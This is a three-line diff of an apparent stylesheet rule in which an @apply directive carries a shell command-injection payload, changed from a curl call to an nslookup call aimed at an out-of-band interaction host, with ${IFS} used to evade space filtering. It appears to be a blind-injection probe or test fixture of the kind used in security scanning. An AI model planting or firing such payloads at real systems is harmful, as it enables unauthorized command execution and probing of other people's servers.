@@ -1,3 +1,3 @@
-@apply `$(curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site)` {
+@apply `$(nslookup${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site)` {
   /*!*/
 }
